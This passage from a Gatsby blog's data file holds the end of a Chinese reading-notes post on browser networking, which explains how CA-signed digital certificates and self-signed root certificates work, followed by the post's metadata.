CA，证书也会被判定非法。</p>\n<p>另外，在申请和使用证书的过程中，还需要注意以下三点：</p>\n<ul>\n<li>申请数字证书是不需要提供私钥的，要确保私钥永远只能由服务器掌握；</li>\n<li>数字证书最核心的是 CA 使用它的私钥生成的数字签名；</li>\n<li>内置 CA 对应的证书称为根证书，根证书是最权威的机构，它们自己为自己签名，我们把这称为自签名证书。</li>\n</ul>',
id:"/home/runner/work/GatsbyBlog/GatsbyBlog/blog/浏览器工作原理与实践——浏览器中的网络/index.md absPath of file >>> MarkdownRemark",timeToRead:32,frontmatter:{date:"2021-07-15 02:00:04",path:"/browser-working-principle-network/",tags:"前端, 浏览器, 高级前端, 读书笔记",title:"浏览器工作原理与实践——浏览器中的网络",draft:null}}],length:169,tag:"前端",pagesSum:34,page:9}}}});